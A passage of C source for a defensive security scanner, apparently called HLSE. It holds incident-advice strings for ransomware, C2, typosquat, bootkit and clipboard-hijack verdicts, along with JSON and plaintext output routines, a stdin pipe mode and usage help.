/* Socratic question (Perspective 103): "P101/P102 found and fixed the same
 * JSON/plaintext duplication-and-drift for file and secret — do protect,
 * network, and package have it too?" Yes: each kind's JSON path built its
 * advisory lines from `static const char[]` literals, while the matching
 * plaintext path re-typed shorter, differently-worded printf literals for
 * the exact same verdict. Consolidated into shared accessors, one group per
 * kind, following the same naming convention as the file/secret ones above.
 * Pure refactor — every JSON value is unchanged; only the plaintext wording
 * is upgraded to match (previously-shortened) JSON text word-for-word. */
static const char *
protect_pattern_text(void) {
    return "ransomware / destructive malware indicators detected";
}

static const char *
protect_objective_text(void) {
    return "data destruction and extortion \xe2\x80\x94 ransomware encrypts "
           "accessible files and demands payment; credentials are "
           "often harvested before encryption begins";
}

static const char *
protect_verify_text(void) {
    return "photograph or copy the ransom note before any other "
           "action \xe2\x80\x94 it contains the attacker's ID, contact, "
           "and decryption instructions; consult NCSC/CISA or law "
           "enforcement BEFORE paying \xe2\x80\x94 free decryptors may exist";
}

static const char *
protect_triage_text(void) {
    return "IMMEDIATELY disconnect from the network (unplug Ethernet, "
           "disable WiFi and Bluetooth) \xe2\x80\x94 this stops lateral "
           "movement and stops encryption spreading to network shares; "
           "do NOT reboot \xe2\x80\x94 volatile memory may contain keys; "
           "preserve all logs and report to law enforcement";
}

static const char *
protect_cascade_text(void) {
    return "all credentials on this machine and any network shares "
           "it accessed \xe2\x80\x94 ransomware groups commonly harvest "
           "credentials before encrypting; rotate domain admin, file "
           "server, VPN, and cloud credentials from a clean device";
}

static const char *
net_pattern_text(void) {
    return "suspicious network activity (C2 / exfiltration indicator)";
}

static const char *
network_objective_text(void) {
    return "data exfiltration or persistent access \xe2\x80\x94 an active "
           "process may be beaconing to a command-and-control server, "
           "exfiltrating credentials, or establishing lateral movement";
}

static const char *
network_verify_text(void) {
    return "identify the process owning the suspicious connection: "
           "'lsof -i' or 'ss -tp' on Linux, 'netstat -b' on Windows; "
           "verify it against your known installed software before "
           "taking any disruptive action";
}

static const char *
network_triage_text(void) {
    return "if the process is unrecognised: kill it and isolate the "
           "host from the network; preserve network capture (tcpdump) "
           "and process memory before rebooting \xe2\x80\x94 evidence is lost "
           "on reboot; report to your security team or law enforcement";
}

static const char *
network_cascade_text(void) {
    return "credentials stored on this machine (browser, credential "
           "manager, SSH keys, cloud CLI tokens) \xe2\x80\x94 an active "
           "C2 connection may already be exfiltrating them; rotate all "
           "from a clean device before the machine is brought back online";
}

static const char *
package_pattern_text(void) {
    return "dependency confusion / typosquat supply-chain attack";
}

static const char *
package_objective_text(void) {
    return "arbitrary code execution \xe2\x80\x94 package install scripts "
           "run with your user privileges; any secret readable from "
           "your shell (API keys, tokens, SSH keys) is at risk";
}

static const char *
package_verify_text(void) {
    return "verify the exact package name on the official registry "
           "page before installing; if you must proceed, install "
           "with --ignore-scripts (npm/pnpm) or --no-build (uv/pip) "
           "so a malicious preinstall/postinstall/prepare hook "
           "cannot run \xe2\x80\x94 lifecycle scripts execute with your "
           "privileges before install even completes; most "
           "ecosystems also support --dry-run to preview first";
}

static const char *
package_triage_text(void) {
    return "if already installed, remove the package immediately "
           "(pip uninstall / npm uninstall / cargo remove) and "
           "inspect the lifecycle scripts (preinstall/postinstall/"
           "prepare); self-propagating worms (Shai-Hulud) run a "
           "disk-wide secret scan (TruffleHog), so rotate EVERY "
           "credential on the machine, not just shell-environment "
           "ones \xe2\x80\x94 if you publish packages, revoke your "
           "npm/PyPI token FIRST, before the worm can republish "
           "from your account";
}

static const char *
package_cascade_text(void) {
    return "if you maintain packages, your registry publish token is "
           "the worm's self-propagation vector \xe2\x80\x94 it "
           "republishes the payload into YOUR packages, infecting "
           "every downstream user; revoke the token and audit your "
           "published versions for unexpected releases, plus all "
           "disk-resident API keys, SSH keys, and cloud credentials "
           "a TruffleHog-style scan would harvest";
}

/* Perspective 104: esp and clipboard are BLOCK+-only (score is always 0 or
 * >=60/70 — no ALERT-band split needed, unlike file/secret/protect/network/
 * package), but they had the same JSON/plaintext duplication-and-drift the
 * P101-103 accessors fixed elsewhere. Consolidated here. */
static const char *
esp_pattern_text(void) {
    return "UEFI bootkit indicator in EFI System Partition";
}

static const char *
esp_objective_text(void) {
    return "persistent firmware-level access \xe2\x80\x94 a bootkit "
           "survives OS reinstall; it executes before the OS boots "
           "and can disable security software, log keystrokes, and "
           "intercept disk encryption before the OS sees it";
}

static const char *
esp_verify_text(void) {
    return "run a second scan with a different tool (CHIPSEC, "
           "vendor UEFI integrity check) before taking disruptive "
           "action \xe2\x80\x94 bootkit false positives exist and the "
           "remediation is destructive; check Secure Boot status "
           "first (mokutil --sb-state)";
}

static const char *
esp_triage_text(void) {
    return "do NOT reinstall the OS first \xe2\x80\x94 it will not "
           "remove a bootkit; consult an incident-response specialist; "
           "if confirmed, flash the UEFI firmware from a vendor-signed "
           "image and replace Secure Boot enrollment keys "
           "(mokutil --reset)";
}

static const char *
esp_cascade_text(void) {
    return "all credentials and disk encryption keys on this machine "
           "\xe2\x80\x94 a bootkit has pre-OS access to encrypted volumes "
           "and can log all keystrokes before encryption; rotate from "
           "a clean device and consider the machine untrusted until "
           "the firmware is re-flashed";
}

static const char *
clipboard_pattern_text(void) {
    return "cryptocurrency clipboard hijack (clipper malware)";
}

static const char *
clipboard_objective_text(void) {
    return "cryptocurrency theft \xe2\x80\x94 your copied address was "
           "silently replaced; funds sent reach the attacker's wallet "
           "and cannot be recovered";
}

static const char *
clipboard_verify_text(void) {
    return "re-copy the address from the recipient's own verified "
           "source and compare every character in your wallet app "
           "before confirming the transaction";
}

static const char *
clipboard_triage_text(void) {
    return "if you already sent funds: contact your exchange or "
           "wallet provider immediately \xe2\x80\x94 crypto transfers "
           "are irreversible; file a report with law enforcement "
           "and the exchange's fraud team";
}

static const char *
clipboard_cascade_text(void) {
    return "every crypto address you have copied since the last "
           "clean boot \xe2\x80\x94 clipper malware intercepts all "
           "clipboard activity; assume all recent copies were "
           "redirected and run a full malware scan before "
           "transacting again";
}

/* Build a TextVerdict from a ScanResult.
 *
 * Six identical copies of this lived inline, each restating the clamp
 * `sr->n_reasons < CAP ? sr->n_reasons : CAP`. That bound has to be right
 * every time; here it is written once. */
static void
text_verdict_from_scan(TextVerdict *tv, const ScanResult *sr) {
    const int cap = (int)(sizeof(tv->reasons) / sizeof(tv->reasons[0]));
    int i;
    memset(tv, 0, sizeof(*tv));
    tv->score = sr->score;
    tv->n_reasons = sr->n_reasons < cap ? sr->n_reasons : cap;
    for (i = 0; i < tv->n_reasons; i++)
        snprintf(tv->reasons[i], sizeof(tv->reasons[0]), "%s", sr->reasons[i]);
}

/* Emit  ,"name":"<escaped value>"  — or nothing at all when value is NULL.
 *
 * This existed inline at ~93 sites, each declaring its own char esc_x[512],
 * calling hlse_json_escape(), then printf-ing. Beyond the repetition, that
 * made escaping a property every call site had to remember: one that forgot
 * would emit malformed or injectable JSON. Here it cannot be forgotten. */
static void
json_field(const char *name, const char *value) {
    char esc[512];
    if (!value) return;
    hlse_json_escape(value, esc, sizeof(esc));
    printf(",\"%s\":\"%s\"", name, esc);
}

static void
print_json_url(const char *url, const Verdict *v) {
    char escaped_url[MAX_URL * 2];
    const char *pat  = hlse_classify_url_attack(v);
    const char *pid  = hlse_url_pattern_id(v);  /* stable HLSE-URL-* token */
    const char *vrf  = hlse_verification_for(v);
    const char *cas  = hlse_cascade_risk(v);
    const char *exon = hlse_url_exoneration(v); /* NULL outside [15,59] */
    char obj_buf[320] = "";
    char tri_buf[512] = "";
    char asc_diff_buf[256] = "";
    char cf_buf[160] = "";
    char esc_pat[256] = "";
    char esc_obj[320] = "";
    char esc_vrf[512] = "";
    char esc_tri[1024] = "";
    char esc_cas[512] = "";
    char esc_asc[384] = "";
    char esc_cf[320] = "";
    char esc_exon[512] = "";
    char safe[384]; /* compound "https://A and https://B" */
    char esc_safe[768] = "";
    char conf[160];
    char esc_conf[320] = "";
    char canon_brand[64];
    int  has_obj    = hlse_compound_objective(v, obj_buf, sizeof(obj_buf));
    int  has_safe   = hlse_safe_destinations(v, safe, sizeof(safe));
    int  has_conf   = hlse_confusable_report(url, conf, sizeof(conf));
    int  has_asc    = hlse_ascii_diff(v, asc_diff_buf, sizeof(asc_diff_buf));
    int  signal_cnt = hlse_confidence_for(v, cf_buf, sizeof(cf_buf));
    int  has_tri    = hlse_compound_triage(v, tri_buf, sizeof(tri_buf));
    int  has_canon  = (v->score == 0) &&
                      hlse_canonical_confirm(url, canon_brand, sizeof(canon_brand));
    hlse_json_escape(url, escaped_url, sizeof(escaped_url));
    if (pat)     hlse_json_escape(pat,          esc_pat,  sizeof(esc_pat));
    if (has_obj) hlse_json_escape(obj_buf,      esc_obj,  sizeof(esc_obj));
    if (vrf)     hlse_json_escape(vrf,          esc_vrf,  sizeof(esc_vrf));
    if (has_tri) hlse_json_escape(tri_buf,      esc_tri,  sizeof(esc_tri));
    if (cas)     hlse_json_escape(cas,          esc_cas,  sizeof(esc_cas));
    if (has_asc) hlse_json_escape(asc_diff_buf, esc_asc,  sizeof(esc_asc));
    if (signal_cnt > 0) hlse_json_escape(cf_buf, esc_cf,  sizeof(esc_cf));
    if (has_safe) hlse_json_escape(safe, esc_safe, sizeof(esc_safe));
    if (has_conf) hlse_json_escape(conf, esc_conf, sizeof(esc_conf));
    if (exon)    hlse_json_escape(exon, esc_exon, sizeof(esc_exon));
    printf("{\"kind\":\"url\",\"hlse_version\":\"" HLSE_VERSION "\","
           "\"target\":\"%s\",\"score\":%d,\"action\":\"%s\","
           "\"severity\":%d",
           escaped_url, v->score, action_for_score(v->score),
           hlse_severity_for_score(v->score));
    if (signal_cnt > 0) printf(",\"signal_count\":%d,\"confidence\":\"%s\"",
                               signal_cnt, esc_cf);
    if (has_canon)  printf(",\"canonical_brand\":\"%s\"", canon_brand);
    if (v->score == 0) {
        /* Use the narrower post-authentication caveat when the domain was
         * positively confirmed against the brand registry — the generic
         * "pixel-perfect clone" blind spot contradicts a canonical confirm. */
        const char *bs = hlse_blindspot_for(has_canon ? "url_canonical" : "url");
        json_field("blind_spot", bs);
    }
    if (pat)        printf(",\"pattern\":\"%s\"", esc_pat);
    if (pid)        printf(",\"pattern_id\":\"%s\"", pid); /* stable SIEM token */
    if (has_obj)    printf(",\"objective\":\"%s\"", esc_obj);
    if (has_conf)   printf(",\"confusable\":\"%s\"", esc_conf);
    if (has_asc)    printf(",\"ascii_diff\":\"%s\"", esc_asc);
    if (has_safe)   printf(",\"safe_url\":\"%s\"", esc_safe);
    if (vrf)        printf(",\"verify\":\"%s\"", esc_vrf);
    if (has_tri)    printf(",\"triage\":\"%s\"", esc_tri);
    if (cas)        printf(",\"cascade_risk\":\"%s\"", esc_cas);
    if (exon)       printf(",\"exoneration\":\"%s\"", esc_exon);
    if (g_from_channel) {
        int d   = channel_delta(g_from_channel);
        int eff = v->score + d; if (eff > 100) eff = 100;
        printf(",\"channel\":\"%s\",\"channel_delta\":%d,\"effective_score\":%d,"
               "\"effective_action\":\"%s\",\"effective_severity\":%d",
               g_from_channel, d, eff, action_for_score(eff),
               hlse_severity_for_score(eff));
        {
            const char *ch_rsn = channel_reason(g_from_channel);
            if (ch_rsn) {
                json_field("channel_reason", ch_rsn);
            }
        }
    }
    printf(",\"reasons\":[");
    {
        int i;
        for (i = 0; i < v->n_reasons; i++) {
            char esc[256];
            hlse_json_escape(v->reasons[i], esc, sizeof(esc));
            printf("%s\"%s\"", i > 0 ? "," : "", esc);
        }
    }
    printf("]}\n");
}

static void
print_json_text(const char *text, const TextVerdict *v) {
    char esc[1024];
    char preview[256];
    const char *pat  = hlse_classify_text_attack(v);
    const char *pid  = hlse_text_pattern_id(v);   /* stable HLSE-* token */
    const char *tobj = hlse_text_objective(v);    /* NULL outside score >= 60 */
    const char *tvrf = hlse_text_verify(v);       /* NULL outside score >= 40 (P95) */
    const char *ttri = hlse_text_triage(v);       /* NULL outside score >= 60 */
    const char *tcas = hlse_text_cascade(v);      /* NULL outside score >= 60 */
    const char *exon = hlse_text_exoneration(v);  /* NULL outside [15,59] */
    char cf_buf[160] = "";
    char esc_pat[256] = "";
    char esc_tobj[512] = "";
    char esc_tvrf[512] = "";
    char esc_ttri[640] = "";
    char esc_tcas[512] = "";
    char esc_exon[512] = "";
    char esc_cf[320] = "";
    int  sig_cnt = hlse_text_confidence(v, cf_buf, sizeof(cf_buf));
    /* Truncate long text for the JSON preview */
    {
        size_t n = strlen(text);
        if (n > 120) n = 120;
        memcpy(preview, text, n);
        preview[n] = '\0';
    }
    hlse_json_escape(preview, esc, sizeof(esc));
    if (pat)        hlse_json_escape(pat,    esc_pat,  sizeof(esc_pat));
    if (tobj)       hlse_json_escape(tobj,   esc_tobj, sizeof(esc_tobj));
    if (tvrf)       hlse_json_escape(tvrf,   esc_tvrf, sizeof(esc_tvrf));
    if (ttri)       hlse_json_escape(ttri,   esc_ttri, sizeof(esc_ttri));
    if (tcas)       hlse_json_escape(tcas,   esc_tcas, sizeof(esc_tcas));
    if (exon)       hlse_json_escape(exon,   esc_exon, sizeof(esc_exon));
    if (sig_cnt > 0) hlse_json_escape(cf_buf, esc_cf,  sizeof(esc_cf));
    printf("{\"kind\":\"text\",\"hlse_version\":\"" HLSE_VERSION "\","
           "\"target\":\"%s\",\"score\":%d,\"action\":\"%s\","
           "\"severity\":%d",
           esc, v->score, hlse_text_action_for_score(v->score),
           hlse_severity_for_score(v->score));
    if (sig_cnt > 0) printf(",\"signal_count\":%d,\"confidence\":\"%s\"",
                            sig_cnt, esc_cf);
    if (v->score == 0) {
        const char *bs = hlse_blindspot_for("text");
        json_field("blind_spot", bs);
    }
    if (pat)  printf(",\"pattern\":\"%s\"",     esc_pat);
    if (pid)  printf(",\"pattern_id\":\"%s\"", pid);   /* stable SIEM token */
    if (tobj) printf(",\"objective\":\"%s\"",   esc_tobj);
    if (tvrf) printf(",\"verify\":\"%s\"",      esc_tvrf);
    if (ttri) printf(",\"triage\":\"%s\"",      esc_ttri);
    if (tcas) printf(",\"cascade_risk\":\"%s\"",esc_tcas);
    if (exon) printf(",\"exoneration\":\"%s\"", esc_exon);
    if (g_from_channel) {
        int d   = channel_delta(g_from_channel);
        int eff = v->score + d; if (eff > 100) eff = 100;
        printf(",\"channel\":\"%s\",\"channel_delta\":%d,\"effective_score\":%d,"
               "\"effective_action\":\"%s\",\"effective_severity\":%d",
               g_from_channel, d, eff, hlse_text_action_for_score(eff),
               hlse_severity_for_score(eff));
        {
            const char *ch_rsn = channel_reason(g_from_channel);
            if (ch_rsn) {
                json_field("channel_reason", ch_rsn);
            }
        }
    }
    printf(",\"reasons\":[");
    {
        int i;
        for (i = 0; i < v->n_reasons; i++) {
            char r[256];
            hlse_json_escape(v->reasons[i], r, sizeof(r));
            printf("%s\"%s\"", i > 0 ? "," : "", r);
        }
    }
    printf("]}\n");
}

/* Print the per-URL human-readable advisory lines for an actionable verdict —
 * the synthesis lenses layered on top of the raw per-signal reasons:
 *   ▸ Pattern             attack-class label
 *   ⌖ Disguised char      first non-ASCII confusable codepoint
 *   ◉ Attacker's goal     objective / asset at risk
 *   → Safe destination    canonical brand domain to use instead
 *   ✓ Verify independently  high-confidence (>=60) confirmation test
 *   ⚑ If already clicked  post-click incident triage
 *   ⊕ Also change         password-reuse cascade risk (other accounts)
 *
 * Centralised so the three text output sites (stdin / `text` subcommand /
 * default auto-detect) cannot drift out of sync — every lens fires from one
 * place. `url` is the raw input (needed for confusable/host inspection); `uv`
 * is its URL verdict. Each line is conditional, so a low-score verdict prints
 * only the lenses that apply.                                                */
static void
print_url_advisories(const char *url, const Verdict *uv) {
    const char *pat = hlse_classify_url_attack(uv);
    const char *vrf = hlse_verification_for(uv);
    const char *cas = hlse_cascade_risk(uv);
    char obj_buf[320];
    char safe[384]; /* 384: compound "https://A and https://B" fits in 2*128+8 */
    char conf[160];
    char asc_diff[256];
    char cf_buf[160];
    char tri_buf[512]; /* 512: compound two-step triage */
    if (pat) printf("  \xe2\x96\xb8 Pattern: %s\n", pat);
    if (hlse_confidence_for(uv, cf_buf, sizeof(cf_buf)))
        printf("  \xe2\x9a\x96 Confidence: %s\n", cf_buf);  /* ⚖ */
    if (hlse_confusable_report(url, conf, sizeof(conf)))
        printf("  \xe2\x8c\x96 Disguised char: %s\n", conf);
    if (hlse_ascii_diff(uv, asc_diff, sizeof(asc_diff)))
        printf("  \xe2\x8c\x96 ASCII lookalike: %s\n", asc_diff);
    if (hlse_compound_objective(uv, obj_buf, sizeof(obj_buf)))
        printf("  \xe2\x97\x89 Attacker's goal: %s\n", obj_buf);
    if (hlse_safe_destinations(uv, safe, sizeof(safe)))
        printf("  \xe2\x86\x92 Safe destination: %s\n", safe);
    if (vrf) printf("  \xe2\x9c\x93 Verify independently: %s\n", vrf);
    if (hlse_compound_triage(uv, tri_buf, sizeof(tri_buf)))
        printf("  \xe2\x9a\x91 If already clicked: %s\n", tri_buf);
    if (cas) printf("  \xe2\x8a\x95 Also change: %s\n", cas);  /* ⊕ */
}

/* Print the per-text human-readable advisory lines for an actionable text
 * verdict — the text counterpart of print_url_advisories(). Layers the same
 * synthesis lenses on top of the raw per-signal reasons:
 *   ▸ Pattern           social-engineering attack-class label
 *   ◉ Attacker's goal   asset at risk (score >= 60)
 *   ✓ Verify first      pre-action verification check (score >= 60)
 *   ⚖ Confidence        how many independent signal families concur
 *   ⚑ If you acted      post-response triage (score >= 60)
 *   ⊕ Also change       cascade risk — other accounts at stake (score >= 60)
 *
 * Centralised so the three text output sites (stdin / `text` subcommand /
 * default auto-detect) cannot drift out of sync — exactly the guarantee
 * print_url_advisories() gives the URL path. Like its URL sibling, this does
 * NOT print the "↺ Could be benign" exoneration or the "· <channel>" line:
 * those depend on caller-local state (channel reason) and are emitted by each
 * caller after this returns. Each line is conditional, so a low-score verdict
 * prints only the lenses that apply.                                         */
/* Print a file verdict in human form: header, reasons, then the advisory
 * ladder. `display` is the path or name to show.
 *
 * This body existed twice — once in the `scan <dir>` walker and once in the
 * standalone `file` subcommand — and the copy in the walker carries a comment
 * explaining that the advisory wording is shared "so plaintext and JSON never
 * again describe the same verdict with different wording". The wording was
 * indeed shared with JSON, and then duplicated within plaintext. One printer
 * now, so the two entry points cannot drift from each other either. */
static void
print_file_verdict_plain(const FileVerdict *fv, const char *display) {
    int i;
    printf("%-7s [%d]  %s\n",
           hlse_action_for_score(fv->score), fv->score, display);
    for (i = 0; i < fv->n_reasons; i++)
        printf("  \xc2\xb7 %s\n", fv->reasons[i]);
    if (fv->score >= 40) {
        printf("  \xe2\x96\xb8 Pattern: %s\n", file_classify_pattern(fv));
        printf("  \xe2\x97\x89 Attacker's goal: %s\n", file_masquerade_objective());
        printf("  \xe2\x9c\x93 Verify first: %s\n", file_masquerade_verify());
    }
    if (fv->score >= 60) {
        printf("  \xe2\x9a\x91 If you acted: if already opened, disconnect "
               "from the network; run antivirus; change credentials for "
               "any active session\n");
        printf("  \xe2\x8a\x95 Also change: all credentials and session "
               "tokens active when the file was opened \xe2\x80\x94 check "
               "for persistence (startup items, scheduled tasks, new "
               "browser extensions)\n");
    }
    if (fv->score > 0 && fv->score < 60) {
        const char *ex = hlse_exoneration_for("file", fv->score);
        if (ex) printf("  \xe2\x86\xba Could be benign: %s\n", ex);
    }
}

/* The secret-verdict advisory ladder: caveat, then pattern / goal / verify /
 * immediate action / also-change once the score is actionable, then the
 * benign-explanation line below that.
 *
 * Duplicated between the `scan <dir>` walker and the `secret` subcommand. The
 * headers around it legitimately differ (the walker prints path:line, the
 * subcommand prints the finding type and a confidence note), but the advice
 * itself must not — a leaked credential does not become less urgent because
 * of which entry point found it. */
/* The JSON counterpart of print_secret_advisories(): caveat, the actionable
 * pattern / objective / verify / triage / cascade fields, and the
 * benign-explanation field. Duplicated between the `scan <dir>` walker and the
 * `secret` subcommand, exactly as the plain-text ladder was. */
static void
json_secret_advisories(const SecretVerdict *sv) {
    if (sv->n_findings > 0) {
        /* Unconditional on score: a Stripe publishable key is public by
         * design at any score, not a probabilistic false-positive hedge. */
        json_field("caveat", secret_finding_caveat(sv->findings[0].type));
    }
    if (sv->score >= 60 && sv->n_findings > 0) {
        const char *ftype = sv->findings[0].type;
        char epat[128];
        secret_pattern_label(ftype, epat, sizeof(epat));
        json_field("pattern", epat);
        json_field("pattern_id", secret_pattern_id(ftype));
        json_field("objective", secret_objective_for(ftype));
        json_field("verify", secret_verify_text());
        json_field("triage", secret_triage_text());
        json_field("cascade_risk", secret_cascade_text());
    }
    if (sv->score > 0 && sv->score < 60)
        json_field("exoneration", hlse_exoneration_for("secret", sv->score));
}

static void
print_secret_advisories(const SecretVerdict *sv) {
    if (sv->n_findings > 0) {
        const char *cav = secret_finding_caveat(sv->findings[0].type);
        if (cav) printf("  \xe2\x9a\xa0 Caveat: %s\n", cav);
    }
    if (sv->score >= 60 && sv->n_findings > 0) {
        const char *ftype = sv->findings[0].type;
        const char *sobj  = secret_objective_for(ftype);
        char epat[128];
        secret_pattern_label(ftype, epat, sizeof(epat));
        printf("  \xe2\x96\xb8 Pattern: %s\n", epat);
        if (sobj) printf("  \xe2\x97\x89 Attacker's goal: %s\n", sobj);
        printf("  \xe2\x9c\x93 Verify first: %s\n", secret_verify_text());
        printf("  \xe2\x9a\x91 Immediate action: %s\n", secret_triage_text());
        printf("  \xe2\x8a\x95 Also change: %s\n", secret_cascade_text());
    }
    if (sv->score > 0 && sv->score < 60) {
        const char *ex = hlse_exoneration_for("secret", sv->score);
        if (ex) printf("  \xe2\x86\xba Could be benign: %s\n", ex);
    }
}

/* Build a one-reason TextVerdict so a non-text verdict can borrow the text
 * classifier's pattern / objective / verify / triage / cascade wording.
 *
 * Five sites hand-rolled this — the email/BEC path and the paste path — each
 * repeating the memset, the score copy, n_reasons = 1, and the snprintf into
 * slot zero. It is one idea, so it is one function. */
static void
text_verdict_synth(TextVerdict *tv, int score, const char *reason) {
    memset(tv, 0, sizeof(*tv));
    tv->score = score;
    tv->n_reasons = 1;
    snprintf(tv->reasons[0], sizeof(tv->reasons[0]), "%s", reason);
}

static void
print_text_advisories(const TextVerdict *tv) {
    const char *tpat = hlse_classify_text_attack(tv);
    const char *tobj = hlse_text_objective(tv);
    const char *tvrf = hlse_text_verify(tv);
    const char *ttri = hlse_text_triage(tv);
    const char *tcas = hlse_text_cascade(tv);
    char tcf[160];
    if (tpat) printf("  \xe2\x96\xb8 Pattern: %s\n", tpat);
    if (tobj) printf("  \xe2\x97\x89 Attacker's goal: %s\n", tobj);
    if (tvrf) printf("  \xe2\x9c\x93 Verify first: %s\n", tvrf);
    if (hlse_text_confidence(tv, tcf, sizeof(tcf)))
        printf("  \xe2\x9a\x96 Confidence: %s\n", tcf);
    if (ttri) printf("  \xe2\x9a\x91 If you acted: %s\n", ttri);
    if (tcas) printf("  \xe2\x8a\x95 Also change: %s\n", tcas);
}

/* Score at/above which the process exits 1 (threat). Configurable via
 * --fail-on so a pipeline picks its own risk gate. Default = BLOCK(60). */
static int g_fail_threshold = 60;

/* ─────────────────────────── stdin pipe mode ────────────────────────── */

static int
stdin_mode(int json_out) {
    char line[MAX_URL];
    int  any_threat = 0;

    while (fgets(line, sizeof(line), stdin)) {
        size_t n = strlen(line);
        while (n > 0 && (line[n-1] == '\n' || line[n-1] == '\r'))
            line[--n] = '\0';
        if (n == 0) continue;

        ScanResult sr = hlse_scan(line);
        if (json_out) {
            /* JSON uses specific formatters for structured output.
             * For text lines, reuse sr (not hlse_check_text alone) so
             * embedded URL extraction is honoured — same as GAP-N fix. */
            if (sr.is_url) {
                Verdict uv = check_url(line);
                print_json_url(line, &uv);
            } else {
                TextVerdict tv;
                text_verdict_from_scan(&tv, &sr);
                print_json_text(line, &tv);
            }
        } else if (sr.score == 0) {
            /* Channel-only risk: content scored 0 but delivery channel adds prior */
            if (g_from_channel) {
                int d = channel_delta(g_from_channel);
                if (d > 0) {
                    const char *ch_rsn = channel_reason(g_from_channel);
                    printf("%-7s [%d]  %s\n", hlse_action_for_score(d), d, line);
                    if (ch_rsn) printf("  \xc2\xb7 %s\n", ch_rsn);
                    continue;
                }
            }
            {
                char canon_brand[64];
                printf("OK    %s\n", line);
                if (sr.is_url && hlse_canonical_confirm(line, canon_brand, sizeof(canon_brand)))
                    printf("  \xe2\x9c\x94 Canonical: confirmed authentic %s domain "
                           "(HLSE brand registry)\n", canon_brand);
            }
        } else {
            int i;
            int eff = sr.score;
            const char *ch_rsn = NULL;
            if (g_from_channel) {
                int d = channel_delta(g_from_channel);
                eff += d; if (eff > 100) eff = 100;
                ch_rsn = channel_reason(g_from_channel);
            }
            printf("%-7s [%d]  %s\n",
                   hlse_action_for_score(eff), eff, line);
            for (i = 0; i < sr.n_reasons; i++) {
                /* Amplifier lines are derived meta-labels, not independently
                 * detected facts; the ▸ Pattern line already expresses them
                 * in user-facing language. Keep them in JSON; filter here. */
                if (strncmp(sr.reasons[i], "Amplifier:", 10) == 0) continue;
                printf("  \xc2\xb7 %s\n", sr.reasons[i]);  /* · */
            }
            if (sr.is_url) {
                Verdict uv = check_url(line);
                const char *url_ex = hlse_url_exoneration(&uv);
                print_url_advisories(line, &uv);
                if (ch_rsn) printf("  \xc2\xb7 %s\n", ch_rsn);
                if (url_ex) printf("  \xe2\x86\xba Could be benign: %s\n", url_ex);
            } else {
                TextVerdict tv;
                const char *tex;
                text_verdict_from_scan(&tv, &sr);
                tex  = hlse_text_exoneration(&tv);
                print_text_advisories(&tv);
                if (ch_rsn) printf("  \xc2\xb7 %s\n", ch_rsn);
                if (tex) printf("  \xe2\x86\xba Could be benign: %s\n", tex);
            }
        }
        /* Gate uses effective score (raw + channel boost) so that e.g.
         * --from sms raises exit 0 → exit 1 when boost crosses the threshold. */
        {
            int eff_gate = sr.score;
            if (g_from_channel) {
                int d = channel_delta(g_from_channel);
                eff_gate += d; if (eff_gate > 100) eff_gate = 100;
            }
            if (eff_gate >= g_fail_threshold) any_threat = 1;
        }
    }
    return any_threat ? 1 : 0;
}

/* ─────────────────────────── main ─────────────────────────────────── */

static void
print_usage(const char *prog) {
    fprintf(stderr,
        "HLSE %s — Human-Layer Security Engine\n"
        "\n"
        "Scanning:\n"
        "  %s <url>                    Scan a URL for phishing\n"
        "  %s text \"<message>\"         Scan text for scam patterns\n"
        "  %s <any input>              Auto-detect URL or text\n"
        "\n"
        "Protection:\n"
        "  %s protect <path>           Ransomware / SMB / canary check\n"
        "  %s protect /dev/sda --mbr   MBR/GPT integrity (needs root)\n"
        "  %s esp [path]               UEFI/ESP bootkit-string scan\n"
        "  %s scan <directory>          Recursive secret + file scan (CI/CD)\n"
        "  %s scan <dir> --git-history  Scan every commit ever made, not just the working tree\n"
        "  %s secret \"<text>\"          Scan text/stdin for leaked credentials\n"
        "  %s email \"<headers>\"        Email-header forensics (SPF/DKIM, BEC)\n"
        "  %s clipboard <copied> <pasted>  Crypto address-swap (clipper) check\n"
        "  %s package <name> [eco]     Package typosquat check\n"
        "  %s package --manifest <f>   Scan every dep in requirements.txt / package.json\n"
        "  %s paste \"<command>\"        Pastejacking detection\n"
        "  %s network                  ARP / DNS / hosts safety check\n"
        "  %s file <path>              File masquerade detection\n"
        "  %s audit                    System hardening audit\n"
        "\n"
        "Options:\n"
        "  %s --json <subcommand>      JSON output\n"
        "  %s --sarif scan <dir>       SARIF 2.1.0 output (GitHub code scanning)\n"
        "  %s -q | --quiet             Exit code only (CI/CD mode)\n"
        "  %s --fail-on <tier>         Exit-1 gate: log|alert|block|isolate|0-100 (default block)\n"
        "  %s --from <channel>         Delivery channel: email|sms|dm|qr|manual (boosts URL & text score)\n"
        "  %s --baseline <file>        scan: suppress findings whose fingerprint is listed (CI adoption)\n"
        "  %s --fingerprints scan <d>  scan: emit one fingerprint per finding (generate a baseline)\n"
        "  %s --patterns <file>        Load custom org-specific secret patterns (no rebuild needed)\n"
        "  %s --syslog                 Push findings to syslog (LOG_AUTHPRIV)\n"
        "  %s --log-file <file>        Append one JSONL record per finding (0600)\n"
        "  %s -- <input>               End of options: everything after is data, not flags\n"
        "  %s --stdin [--json]         Pipe mode (one input per line)\n"
        "  %s --self-test              Built-in tests\n"
        "  %s --benchmark              Corpus benchmark\n"
        "  %s --list-patterns [--json] List stable pattern_id tokens (SIEM/SOAR registry)\n"
        "  %s --version | -V           Version\n"
        "  %s -h | --help              Show this help\n"
        "\n"
        "Baseline workflow (brownfield CI adoption):\n"
        "  %s --fingerprints scan . > .hlse-baseline   # accept today's findings\n"
        "  %s --baseline .hlse-baseline scan .          # only NEW findings fail\n"
        "  Inline suppression: put `hlse:allow` on a line to skip its findings.\n"
        "\n"
        "Custom patterns (%s --patterns <file>), one directive per line:\n"
        "  SECRET <prefix> <min_suffix> <charset> <score> <label...>\n"
        "    charset is alnum|alnum_dash|hex|alpha|digit.\n"
        "    Example: SECRET ACME_KEY_ 20 alnum 85 ACME Internal API Key\n"
        "  BRAND <name> <owned_domain1>[,<owned_domain2>...]\n"
        "    Protects your org's name/executives in email BEC display-name checks.\n"
        "    Example: BRAND acmecorp acmecorp.com,acme-corp.com\n"
        "\n"
        "Exit code: 0 = safe, 1 = threat (>= --fail-on, default block/60), 2 = usage error\n",
        HLSE_VERSION,
        prog, prog, prog,                                /* scanning: 3 */
        prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, /* protection: 14 */
        prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, prog, /* options: 17 */
        prog, prog, prog); /* baseline workflow: 2 + custom patterns: 1 */
}

/* Read all of stdin into buf (NUL-terminated, truncated to cap-1 bytes).
 *
 * Perspective 105 (P1-2): the previous version truncated silently at cap-1,
 * so a secret past the buffer end read as "clean" (exit 0) — a false
